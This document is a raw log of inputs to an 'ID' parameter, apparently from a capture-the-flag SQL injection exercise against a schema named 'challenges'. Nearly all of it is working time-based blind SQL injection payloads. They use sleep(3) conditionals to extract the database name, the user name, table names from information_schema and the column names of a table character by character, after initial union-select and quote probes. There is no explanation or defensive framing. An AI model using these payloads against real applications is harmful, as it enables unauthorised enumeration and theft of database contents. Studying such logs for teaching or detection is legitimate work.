ID:1
ID:10
ID:-1' union select 1,2,3 -- 
ID:1'
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1 and if(left(database(),1)='a',0,sleep(3))
ID:1 and if(left(database(),1)='a',0,sleep(3)) #
ID:1' and if(left(database(),1)='a',0,sleep(3)) #
ID:1' and if(left(database(),1)='s',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='a',0,sleep(3)) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = 'f3du98azvf|') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = 'f3du98azvf}') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),11) = 'f3du98azvf~') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'a') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'b') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'c') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'd') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'e') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'f') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'g') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'h') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'i') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'j') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'k') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'l') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'm') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'n') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'o') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'p') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'q') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'r') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 's') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 't') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'u') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'v') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'w') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'x') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'y') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'z') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'A') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'B') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'C') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'D') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'E') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'F') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'G') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'H') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'I') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'J') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'K') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'L') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'M') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'N') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'O') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'P') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'Q') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'R') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'S') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'T') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'U') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'V') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'W') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'X') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'Y') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = 'Z') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '0') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '1') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '2') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '3') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '4') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '5') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '6') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '7') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '8') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '9') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '!') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '"') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '$') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '%') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '&') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = ''') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '(') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = ')') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '*') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '+') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = ',') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '-') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '.') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '/') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = ':') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = ';') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '<') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '=') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '>') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '?') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '@') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '[') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '\') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = ']') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '^') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '_') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '`') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '{') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '|') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '}') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 1,1),1) = '~') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),1) = 'a') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),1) = 'b') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),1) = 'c') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),1) = 'd') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),1) = 'e') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),1) = 'f') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),1) = 'g') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),1) = 'h') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),1) = 'i') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),2) = 'ia') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),2) = 'ib') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),2) = 'ic') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),2) = 'id') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'ida') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idb') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idc') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idd') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'ide') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idf') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idg') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idh') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idi') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idj') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idk') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idl') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idm') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idn') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'ido') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idp') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idq') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idr') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'ids') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idt') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idu') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idv') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idw') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idx') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idy') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idz') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idA') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idB') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idC') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idD') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idE') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idF') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idG') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idH') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idI') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idJ') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idK') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idL') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idM') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idN') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idO') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idP') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idQ') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idR') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idS') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idT') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idU') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idV') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idW') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idX') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idY') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'idZ') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id0') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id1') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id2') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id3') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id4') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id5') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id6') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id7') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id8') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id9') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id!') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id"') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id$') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id%') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id&') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id'') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id(') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id)') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id*') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id+') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id,') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id-') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id.') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id/') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id:') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id;') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id<') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id=') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id>') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id?') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id@') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id[') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id\') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id]') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id^') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id_') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id`') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id{') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id|') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id}') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 0,1),3) = 'id~') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'a') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'b') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'c') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'd') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'e') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'f') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'g') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'h') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'i') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'j') , sleep(3) , 0) #
ID:1' and if( (left((select column_name from information_schema.columns where table_name = 'f3du98azvf' limit 1,1),1) = 'k') , sleep(3) , 0) #
